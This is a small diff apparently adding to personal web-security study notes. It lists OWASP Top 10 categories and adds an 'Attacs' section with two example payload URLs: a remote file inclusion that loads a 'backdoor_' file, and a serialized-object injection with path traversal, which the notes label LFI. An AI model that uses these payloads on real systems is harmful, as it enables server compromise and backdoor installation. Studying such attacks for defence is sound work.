@@ -68,3 +68,7 @@ cat  /var/log/nginx/access.log
 * A08:2021-Software and Data Integrity Failures 
 * A09:2021-Security Logging and Monitoring Failures 
 * A10:2021-Server-Side Request Forgery
+
+## Attacs
+* RFI http://192.168.1.44/vuln_page.php?file=http://192.168.1.44/backdoor_
+* LFI http://192.168.1.44/vuln.php?data=O:8:%22Example1%22:1:{s:10:%22cache_file%22;s:15:%22../../index.php%22;}
